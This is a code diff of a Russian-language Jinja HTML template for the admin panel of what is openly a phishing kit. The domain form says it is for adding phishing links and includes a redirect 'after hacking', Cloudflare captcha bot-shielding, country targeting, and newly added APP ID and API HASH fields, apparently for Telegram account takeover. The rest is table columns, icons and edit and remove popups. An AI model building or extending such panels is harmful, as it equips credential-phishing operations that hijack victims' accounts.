@@ -18,14 +18,25 @@
     <h3 class="title">Мои домены</h3>
     <p class="desc">Здесь вы можете добавить домены и смотреть текущию домены</p>
     
-    <button class="domains__btn btn" data-fancybox data-src="#add_domains">Добавить домен</button>
+
+
+    <button class="domains__btn btn" data-fancybox data-src="#add_domains" id="add_domain">Добавить домен</button>
+
     
+
+
+
+
+
+
+
 
     <div class="main__table-container">
         <h3 class="main__table-title">Количество доменов: {{ domains | length }}</h3>
         <table>
             <thead>
                 <tr>
+                    <th>ID</th>
                     <th>Домен</th>
                     <th>NS сервера</th>
                     <th>Шаблон</th>
@@ -38,13 +49,17 @@
             <tbody>
                 {% for domain in domains %}
                 <tr>
-                    <td><a href="https:/{{ domain[0] }}">https://{{ domain[0] }}</a></td>
-                    <td>{{ domain[1] }}</td>
-                    <td>{{ domain[2] }}</td>
-                    <td>{% if domain[4] == 'true' %}Включена{% else %}Выключена{% endif %}</td>
-                    <td>{% if domain[3] == 'pending' %}В процессе{% else %}Активна{% endif %}                    </td>
+                    <td id="id">{{ domain[0] }}</td>
+                    <td><a href="https://{{ domain[1] }}/{{ domain[2] }}" data="{{ domain[1] }}" id="domain_link">https://{{ domain[1] }}/{{ domain[2] }}</a></td>
+                    <td>{{ domain[3] | replace(", ", "<br>") | safe}}</td>
+                    <td>{{ domain[4] }}</td>
+                    <td>{% if domain[6] == 'true' %}<span class="enabled">Включена</span>{% else %}<span class="disabled">Выключена</span>{% endif %}</td>
+                    <td id="domain_status">{% if domain[4] == 'pending' %}<span class="inprocess">В процессе</span>{% else %}<span class="enabled">Активна</span>{% endif %}</td>
+                    <td>{{ domain[7] }}</td>
                     <td>{{ domain[8] }}</td>
-                    <td>{{ domain[9] }}</td>
+                    <td><a  id="edit_domain"><img width="20px" class="main__table-icon" alt="Изменить домен" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAACXBIWXMAAAsTAAALEwEAmpwYAAADUklEQVR4nO2bS0zUQByHx2eM4eDN4FUPHj3L64R60OjFpLOo0WhE8MJBg7eRC4iIJgY1vk88fJwwkigJMwtC1BA3PCSBCArLJmjiGmEFF0r/Zpog++ra7bZ0us4vmVOf39eZ6XTaIiQjI5MyXbgEUfwEURxCDKuIYVjzQpVFRHE9yjRA1iOmlCKGryOqtCOGKWL4GWK+akTx7vQb95/dhKhy1xXgFGWz/3gUAKrNlhvBjvvbe8/NGEvFmn5h/WX5qQWIBQ+XJlrBbBqmXsAGf5nJ2oVDiPr2JFf7mJUOD1+D/tkJiGpLIHrI5+cWJCud8QKY8nRl4aGhBvBKrMHrfcythOqvd3j6Qn7lcxqeKT2IHs1LqAGrvX3uVnsjeJ6YlXK32uPu1PAeEmAVfufbqkljeI8IsApfFKiBmeiPWpQ2TGwB2cDPqQt8F5c9K4BkD+9dAcQeeG8KIBbhi5PhvSeA2AvvLQHEfnjvCCBZwEfU3+l2Lb4A4hy8+AKIs/BiCyAW4UsHamF+mU8agXcF1E+1Ow5/cbwZNvuP/WOOkbkjIL+vwukrr0+v6dtSHBVOwIXx5ozg9w3UZQTPE7cP0QRooMH5sceOwQsnoDM8BJVjj2A4EoyTUD76IC38/sE6WFhetHRMYQSEomHY0n1CP8a2N6fh/eynOAnKyE3b4YUSQBJud4kSeO2wG14YAYuaCjv6KpMAuYTX4UF9MFM20hS37MDglazhhRHQ9q0v497eDnhhBBQFalyBF0LAx1/TsI75XIEXQkDF2ENT8Ha1eaEE/FTnIa/nVFrwggCBlq+9sKSp4ERcFdAUepUSemv3STgzeg8Cc1/A6bgqoDxhhLfrXRU0Bl9CeCkCaxVXBQxEJmHvBwJHhhuh43sAlkGDtY7rnaDbkQKYrAEgmwCTfQDITpDJuwDI26BhmBwHgBwIMTkSBDkUZvJZAHIt8lmAmXsWUL30sbTZcJYYAaqxAOq9z+XNhL95WhWgBNMJaFtZ8eDQVciV8JmovwIobjYW4PcVx7YV/tcIt+fF5sDPmZ87v5Bx7Z/iQmMBPAzfMfv2xnMl6RcZo9/mmHI7J+FpyUZkOhQXIqa0IoanXftxMrui6h0ewy2oy1dgHlxGBv1P+QMbOq1ZLtFSeAAAAABJRU5ErkJggg=="></a></td>
+                    <td><a data-fancybox data-src="#remove_domain_form" id="remove_domain"><img width="20px" class="main__table-icon" alt="Удалить домен" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAACXBIWXMAAAsTAAALEwEAmpwYAAABfklEQVR4nO2aS07DMBCGveIGVHCFLOaP1B3leryORStRUVjBggsUrvEjk6DyyMOvJFYzn2S1i4lHf2Y8His2RjlSWBQnFLmjyAcBdg6RdwI39hmTGxS57RXwf1yb3GD1lsmyvOi1BVbfkTG5wfotD2U/GlkLIbAJyPuhxuZYhKxTRGaSfGZqvyokEmpEWtDUioSaWi1oakVCTa25pxaBNYFniiyc5xRZUOSBwH2o3/RCRHa1zauLmC8R1rY6XD2G+k0vpCxPCbzUdm9cLs+dbYviLNSvNy4TuojxETFp1eoS4yti8vLbJCZERBb7yK/FXP0e/vtUNmRwsPoTBa9I5C+ko5ql8tvJLFOLDQvbZ5/Js/z+WBMhYpjFhtiwsH3FcPIWpavt8GlnMH7T+BTRNO5C/Q7Rxm+D2nj7DLAN9evNbA5WQ0EV0oJGJBJqarWgqRUJNbX6LgMAKzMSFLmsW5h9ukntvZHpvuZepb0wY8UcIjP8ENlbEVlevFFMP59gbQQJZyA4ZQAAAABJRU5ErkJggg=="></a></td>
+                    <td><a id="update_domain_info"><img width="20px" class="main__table-icon" alt="Обновить домен" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAACXBIWXMAAAsTAAALEwEAmpwYAAACXklEQVR4nO2bwWoUQRCGe72bs+A5MYp2TUDNq8RkqnZR9A2CgojiSUjISUHQpxBvgi8gvoGeBG9RQ7wp/GF23ThxeyfjzPRsd7p+qMPADNP1VXd11c62MSqVSqWqrzXGZRriHgnuB2OMbctYMT51dYhVy3hPAgRpjE/enLc51i3jx8KdXASAm1tYsoKv0xdZwS8SvCHGjmU8C8QeZSMsewFAjIclyvtrjOsmJZHg43H0c9wxqYkEh1MAV4a4YFITlRKNSVGkAKAzgHQJQHMAaRJEJLsABpaxR4KfJNgtrhPaBTCwghf/9AmvzWOcSwAAXM63h0BRAKh0vh0ECh5ALeebQ6CgAYwT3svyGOtc/1dipGABOCLPeFVE+OSYx/c9bzwTKEgA7shPIzs75ur7owOQMTarnHGPeRZCxtiMEgANsVUVyfljPgnB5tiIEsDYkRwb1wS3XNO4esyTZyfOI84l0OuYSQFAZwDpEoDmADq7SRCDYl9tuqVUPRsFgKxUVbUpKmpVVSECoFJV1aasrFVVhboEbF+NRU9qULtgbsvoaC2dLagJSA2LN/j/caEntahe4ZoJbgsw8h2V7zgdQsDOd9S/YD6EwJ3vsIHDLIQInO+4g8Wg+Lz0518i7T8z9aQYW/hOpQBEZwB0CYjmAGgSlAR3ARJcPO5VBAcmNdHkLMMUwAeTkmyOdRJ8K3WrD/y8iLFSnNJY+EmRv/bUMt5awe9SDfDl0m2c9wKAGJ9rtcwLMsv4no1ww4vzoQOwgnfezw9lIywXpzQCOCkyNmI8IcZd746rVCqVOWM6AgySwI99URUSAAAAAElFTkSuQmCC"></a></td>
                 </tr>
                 {% endfor %}
             </tbody>
@@ -60,10 +75,58 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- Pop up edit_domain -->
+<div class="hidden" id="edit_domain_form"></div>
+
+
+
+
+
+
+
+
+<!-- Pop up add domain -->
 <div class="hidden" id="add_domains">
+    <div id="for_clone">
     <h3 class="title">Добавить домен</h3>
     <p class="desc">Здесь вы можете добавить фишинговые ссылки</p>
-    <form action="" class="form">
+    <form action="" class="form" id="add_domain_form">
         <label for="" class="form__title">Домен</label>
         <input type="text" placeholder="Введите домен..." class="form__input" id="domain">
 
@@ -91,6 +154,11 @@
         <label for="" class="form__title">Редирект после взлома</label>
         <input type="text" placeholder="Введите URL" class="form__input" id="redirect_success">
 
+        <label for="" class="form__title">APP ID</label>
+        <input type="text" placeholder="Введите APP ID" class="form__input" id="app_id">
+
+        <label for="" class="form__title">API HASH</label>
+        <input type="text" placeholder="Введите API HASH" class="form__input" id="api_hash">
 
         <label for="" class="form__title">Включить защиту от ботов (Captcha Cloudflare)</label>
         <input type="checkbox" class="form__checkbox" id="security">
@@ -296,9 +364,47 @@
             <option data-badge="" value="ZW">Zimbabwe</option>
         </select>
 
-        <input type="submit" class="form__button btn" value="Добавить">
+        <input type="submit" class="form__button btn" id="submit_btn" value="Добавить">
     </form>
+    </div>
 </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- Popup remove domain -->
+<div class="hidden" id="remove_domain_form">
+<form class="remove__domain">
+    <h3>Вы уверены что хотите удалить домен: <span id="removing_domain"></span></h3>
+    <div class="remove__domain-btns">
+        <button class="remove__domain-button" type="submit">Да</button>
+        <button class="remove__domain-button" data-fancybox-close>Нет</button>
+    </div>
+</form>
+</div>
+
+
+
+
+
+
 
 
 {% endblock %}
